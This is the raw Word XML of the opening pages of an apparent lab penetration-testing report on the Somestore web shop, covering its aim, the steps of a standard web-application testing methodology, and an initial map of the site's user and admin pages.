              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc531104382 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>57</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="1C26B7C8" w14:textId="16931E91" w:rsidR="00616D9E" w:rsidRDefault="00EA689B">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc531104383" w:history="1">
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>Appendix G – Fuzz parameters</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc531104383 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>58</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="55CBF513" w14:textId="5B80952C" w:rsidR="001905B9" w:rsidRDefault="00404615" w:rsidP="001905B9">
          <w:pPr>
            <w:rPr>
              <w:b/>
              <w:bCs/>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:r>
            <w:rPr>
              <w:b/>
              <w:bCs/>
              <w:noProof/>
            </w:rPr>
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:p>
      </w:sdtContent>
    </w:sdt>
    <w:p w14:paraId="0C85AF19" w14:textId="77777777" w:rsidR="00A60D20" w:rsidRDefault="00A60D20">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F9B19B6" w14:textId="77777777" w:rsidR="00C5090A" w:rsidRDefault="00C5090A">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
        </w:rPr>
        <w:sectPr w:rsidR="00C5090A" w:rsidSect="00C5090A">
          <w:footerReference w:type="default" r:id="rId10"/>
          <w:footerReference w:type="first" r:id="rId11"/>
          <w:type w:val="continuous"/>
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="1440" w:right="1440" w:bottom="1440" w:left="1440" w:header="720" w:footer="720" w:gutter="0"/>
          <w:pgNumType w:start="0"/>
          <w:cols w:space="720"/>
          <w:docGrid w:linePitch="299"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7C364DD4" w14:textId="77777777" w:rsidR="001905B9" w:rsidRDefault="00341658" w:rsidP="00C5090A">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="1" w:name="_Toc531104319"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Introduction</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1"/>
    </w:p>
    <w:p w14:paraId="4A54C1D0" w14:textId="77777777" w:rsidR="00341658" w:rsidRDefault="00341658" w:rsidP="004D7B3D">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="2" w:name="_Toc531104320"/>
      <w:r>
        <w:t>Background</w:t>
      </w:r>
      <w:r w:rsidR="00C9138C">
        <w:t xml:space="preserve"> and Aim</w:t>
      </w:r>
      <w:bookmarkEnd w:id="2"/>
    </w:p>
    <w:p w14:paraId="309C35E2" w14:textId="25A7FA20" w:rsidR="00841EA5" w:rsidRDefault="00841EA5" w:rsidP="00841EA5">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This report will </w:t>
      </w:r>
      <w:r w:rsidR="0086139E">
        <w:t>investigate</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> the vulnerabilities</w:t>
      </w:r>
      <w:r w:rsidR="0086139E">
        <w:t xml:space="preserve"> contained within the</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Somestore web application. A web development compan</w:t>
      </w:r>
      <w:r w:rsidR="00960443">
        <w:t>y recently acquired Somestore and a</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">lthough the site is fully functional, the company </w:t>
      </w:r>
      <w:r w:rsidR="0086139E">
        <w:t>are</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> concerned about any vulnerabilities and bugs</w:t>
      </w:r>
      <w:r w:rsidR="003B457E">
        <w:t xml:space="preserve"> that may be contained within. </w:t>
      </w:r>
      <w:r w:rsidR="002C61D9">
        <w:t>The purpose of the web application</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is to allow customers to </w:t>
      </w:r>
      <w:r w:rsidR="002C61D9">
        <w:t>order</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> technological devices online. </w:t>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:t xml:space="preserve">Due to the website having a large </w:t>
      </w:r>
      <w:r w:rsidR="00960443">
        <w:t>number of features -</w:t>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:t xml:space="preserve"> a large</w:t>
      </w:r>
      <w:r w:rsidR="002C61D9">
        <w:t xml:space="preserve"> attack surface </w:t>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:t>is presented for</w:t>
      </w:r>
      <w:r w:rsidR="002C61D9">
        <w:t xml:space="preserve"> malicious hacker</w:t>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="002C61D9">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="00E17AA0">
        <w:t xml:space="preserve">For the purposes of this </w:t>
      </w:r>
      <w:r w:rsidR="00960443">
        <w:t>investigation</w:t>
      </w:r>
      <w:r w:rsidR="00E17AA0">
        <w:t>, user and admin credentials have been supplied.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C80D468" w14:textId="1262A83F" w:rsidR="004D7B3D" w:rsidRDefault="002C61D9" w:rsidP="00960443">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>The aim of this report is</w:t>
      </w:r>
      <w:r w:rsidR="00EA689B">
        <w:t xml:space="preserve"> to follow a strict methodology</w:t>
      </w:r>
      <w:r w:rsidR="0086139E">
        <w:t xml:space="preserve"> and</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to find and document as many vulnerabilities as possible within the application. </w:t>
      </w:r>
      <w:r w:rsidR="0086139E">
        <w:t>After the investigation has been complete</w:t>
      </w:r>
      <w:r w:rsidR="00960443">
        <w:t>d</w:t>
      </w:r>
      <w:r w:rsidR="0086139E">
        <w:t>, the necessary steps can be implemented to secure the Somestore web application.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="056171AD" w14:textId="77777777" w:rsidR="004D7B3D" w:rsidRDefault="00C9138C" w:rsidP="004D7B3D">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="3" w:name="_Toc531104321"/>
      <w:r>
        <w:t>Methodology</w:t>
      </w:r>
      <w:bookmarkEnd w:id="3"/>
    </w:p>
    <w:p w14:paraId="0652AFCD" w14:textId="04EB7945" w:rsidR="00986778" w:rsidRDefault="00986778" w:rsidP="00986778">
      <w:r>
        <w:t>The methodology that will be followed through</w:t>
      </w:r>
      <w:r w:rsidR="00E3149A">
        <w:t>ou</w:t>
      </w:r>
      <w:r w:rsidR="00960443">
        <w:t>t the</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00960443">
        <w:t>investigation</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is the Web Application Hacker’s Methodology, taken from the </w:t>
      </w:r>
      <w:r w:rsidR="00510F46">
        <w:t>Web Application Hacker’s Handbook, 2</w:t>
      </w:r>
      <w:r w:rsidR="00510F46" w:rsidRPr="00510F46">
        <w:rPr>
          <w:vertAlign w:val="superscript"/>
        </w:rPr>
        <w:t>nd</w:t>
      </w:r>
      <w:r w:rsidR="00510F46">
        <w:t xml:space="preserve"> edition. </w:t>
      </w:r>
      <w:r w:rsidR="00E3149A">
        <w:t xml:space="preserve">The steps that will be followed are </w:t>
      </w:r>
      <w:r w:rsidR="00C270D6">
        <w:t>as follow</w:t>
      </w:r>
      <w:r w:rsidR="00E3149A">
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D2EF68F" w14:textId="77777777" w:rsidR="00E3149A" w:rsidRDefault="00E3149A" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Map the Applications Content</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DB5906E" w14:textId="77777777" w:rsidR="00E3149A" w:rsidRDefault="00E3149A" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Analyze the Application</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3972CCEA" w14:textId="77777777" w:rsidR="00E3149A" w:rsidRDefault="00E3149A" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Test Client-Side Controls</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="042BF7B7" w14:textId="77777777" w:rsidR="00E3149A" w:rsidRDefault="00E3149A" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Test the Authentication Mechanism</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25CADEA1" w14:textId="77777777" w:rsidR="00E3149A" w:rsidRDefault="00E3149A" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00E3149A">
        <w:t>Test the Session Management Mechanism</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72CB9456" w14:textId="77777777" w:rsidR="00E3149A" w:rsidRDefault="00E3149A" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00E3149A">
        <w:t>Test Access Controls</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07069CE2" w14:textId="77777777" w:rsidR="00E3149A" w:rsidRDefault="00E3149A" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00E3149A">
        <w:t>Test for Input-Based Vulnerabilities</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23BD4479" w14:textId="77777777" w:rsidR="00E3149A" w:rsidRDefault="00E3149A" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00E3149A">
        <w:t>Test for Function-Specific Input Vulnerabilities</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EF89C8A" w14:textId="77777777" w:rsidR="00E3149A" w:rsidRDefault="00E3149A" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00E3149A">
        <w:t>Test for Logic Flaws</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="129A3805" w14:textId="77777777" w:rsidR="00E3149A" w:rsidRDefault="00E3149A" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00E3149A">
        <w:t>Test for Shared Hosting Vulnerabilities</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4163E225" w14:textId="77777777" w:rsidR="00E3149A" w:rsidRDefault="00E3149A" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00E3149A">
        <w:t>Test for Application Server Vulnerabilities</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14AF59E9" w14:textId="4878828A" w:rsidR="00E3149A" w:rsidRDefault="00E3149A" w:rsidP="00E3149A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00E3149A">
        <w:t>Miscellaneous Checks</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="296EC1AE" w14:textId="77777777" w:rsidR="009525A9" w:rsidRDefault="00131110" w:rsidP="009525A9">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="4" w:name="_Toc531104322"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Methodology</w:t>
      </w:r>
      <w:bookmarkEnd w:id="4"/>
    </w:p>
    <w:p w14:paraId="1909051B" w14:textId="77777777" w:rsidR="00E3149A" w:rsidRDefault="00E3149A" w:rsidP="00E3149A">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="5" w:name="_Toc531104323"/>
      <w:r>
        <w:t>Map the Applications Content</w:t>
      </w:r>
      <w:bookmarkEnd w:id="5"/>
    </w:p>
    <w:p w14:paraId="0A15AEEF" w14:textId="07B0CCEE" w:rsidR="00895EDB" w:rsidRDefault="00BD2597" w:rsidP="00E3149A">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The first stage is to discover </w:t>
      </w:r>
      <w:r w:rsidR="00C270D6">
        <w:t>the purpose of the web application</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, and what information is </w:t>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:t xml:space="preserve">contained within each web </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">page. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CE4BD4B" w14:textId="77777777" w:rsidR="00895EDB" w:rsidRPr="00895EDB" w:rsidRDefault="00895EDB" w:rsidP="00895EDB">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="6" w:name="_Toc531104324"/>
      <w:r w:rsidRPr="00895EDB">
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>Explore Visible Content</w:t>
      </w:r>
      <w:bookmarkEnd w:id="6"/>
    </w:p>
    <w:p w14:paraId="32168427" w14:textId="794F7DFF" w:rsidR="009F3234" w:rsidRDefault="00BD2597" w:rsidP="009F3234">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>Using Burp Suite, a</w:t>
      </w:r>
      <w:r w:rsidR="005D4394">
        <w:t xml:space="preserve"> user-directed</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> spider is set up to monitor and parse the website. </w:t>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:t xml:space="preserve">While the spider is running, the application will be </w:t>
      </w:r>
      <w:r w:rsidR="003B457E">
        <w:t>manually scanned to discover the</w:t>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:t xml:space="preserve"> features an</w:t>
      </w:r>
      <w:r w:rsidR="003B457E">
        <w:t>d functionality that the application uses.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E69381B" w14:textId="044EFDED" w:rsidR="00BD2597" w:rsidRDefault="003B457E" w:rsidP="00E3149A">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The first page that the user can view is the homepage. </w:t>
      </w:r>
      <w:r w:rsidR="009137D6">
        <w:t>On the homepage, the user is able to read about and purchase</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> electronic devices. </w:t>
      </w:r>
      <w:r w:rsidR="00BD2597">
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r w:rsidR="00E17AA0">
        <w:t>homepage</w:t>
      </w:r>
      <w:r w:rsidR="007D24AF">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00BD2597">
        <w:t>contains</w:t>
      </w:r>
      <w:r w:rsidR="007D24AF">
        <w:t xml:space="preserve"> links to</w:t>
      </w:r>
      <w:r w:rsidR="00BD2597">
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="681F58B6" w14:textId="5C5B57E4" w:rsidR="00BD2597" w:rsidRDefault="009F3234" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">A login </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>page</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="159B38C7" w14:textId="77777777" w:rsidR="00BD2597" w:rsidRDefault="00BD2597" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>A contact us field</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EDDEB07" w14:textId="77777777" w:rsidR="00BD2597" w:rsidRDefault="00BD2597" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">A registration </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>form</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="5C1C5D87" w14:textId="67713A18" w:rsidR="007D24AF" w:rsidRDefault="00BD2597" w:rsidP="007D24AF">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>An about us page</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DCE9184" w14:textId="122CD2E7" w:rsidR="00616D9E" w:rsidRDefault="00616D9E" w:rsidP="007D24AF">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">A </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>products</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> page</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C6C5445" w14:textId="578BDB0E" w:rsidR="00E17AA0" w:rsidRDefault="009137D6" w:rsidP="00E17AA0">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">After </w:t>
      </w:r>
      <w:r w:rsidR="00E17AA0">
        <w:t xml:space="preserve">logging in through the customer login page, using the user credentials provided (Username: </w:t>
      </w:r>
      <w:r w:rsidR="00E17AA0" w:rsidRPr="002E08A8">
        <w:t>hacklab@hacklab.com</w:t>
      </w:r>
      <w:r w:rsidR="00E17AA0">
        <w:t xml:space="preserve"> password: hacklab), </w:t>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:t xml:space="preserve">it was found that the only difference between </w:t>
      </w:r>
      <w:r w:rsidR="009971B4">
        <w:t>having an account</w:t>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:t xml:space="preserve"> compared to not, is that a logged in user</w:t>
      </w:r>
      <w:r w:rsidR="00A71FAE">
        <w:t xml:space="preserve"> has a personal details section.</w:t>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A71FAE">
        <w:t>On this page</w:t>
      </w:r>
      <w:r w:rsidR="007D24AF">
        <w:t xml:space="preserve"> the user</w:t>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:t xml:space="preserve"> can change their password</w:t>
      </w:r>
      <w:r w:rsidR="009971B4">
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="009F3234">
        <w:t xml:space="preserve"> update their </w:t>
      </w:r>
      <w:r w:rsidR="00A71FAE">
        <w:t xml:space="preserve">personal </w:t>
      </w:r>
      <w:r w:rsidR="009971B4">
        <w:t xml:space="preserve">details and </w:t>
      </w:r>
      <w:r w:rsidR="00A71FAE">
        <w:t>upload a picture to be used as their profile picture.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72E9CC35" w14:textId="137680E6" w:rsidR="00E17AA0" w:rsidRDefault="00E17AA0" w:rsidP="00E17AA0">
      <w:pPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The next step was to probe the admin page. On the admin page, </w:t>
      </w:r>
      <w:r w:rsidR="009971B4">
        <w:t>there’s</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> a lar</w:t>
      </w:r>
      <w:r w:rsidR="00131110">
        <w:t xml:space="preserve">ge </w:t>
      </w:r>
      <w:r w:rsidR="009137D6">
        <w:t>number</w:t>
      </w:r>
      <w:r w:rsidR="00131110">
        <w:t xml:space="preserve"> of features that give</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> the </w:t>
      </w:r>
      <w:r w:rsidR="00131110">
        <w:t>ability</w:t>
      </w:r>
      <w:r w:rsidR="00A71FAE">
        <w:t xml:space="preserve"> to edit</w:t>
      </w:r>
      <w:r w:rsidR="009971B4">
        <w:t xml:space="preserve"> details on</w:t>
      </w:r>
      <w:r w:rsidR="00A71FAE">
        <w:t xml:space="preserve"> the website</w:t>
      </w:r>
      <w:r w:rsidR="009971B4">
        <w:t xml:space="preserve"> and view information about the company. Admin users are able to</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E4BF1BC" w14:textId="77777777" w:rsidR="00E17AA0" w:rsidRDefault="00535B28" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>View the Order Report</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1285831B" w14:textId="77777777" w:rsidR="00535B28" w:rsidRDefault="00535B28" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>View the Employee Report</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27035310" w14:textId="226988CD" w:rsidR="00535B28" w:rsidRDefault="007D24AF" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>View the Customer Report</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="459665C1" w14:textId="168AAB17" w:rsidR="00535B28" w:rsidRDefault="00A71FAE" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>View the P</w:t>
      </w:r>
      <w:r w:rsidR="00535B28">
        <w:t>roduct Report</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35CA67E5" w14:textId="77777777" w:rsidR="00535B28" w:rsidRDefault="00535B28" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:spacing w:after="236" w:line="263" w:lineRule="auto"/>
        <w:ind w:right="919"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>Add/edit/delete an Employee</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31007A4F" w14:textId="4F0DD47C" w:rsidR="00535B28" w:rsidRDefault="00A71FAE" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
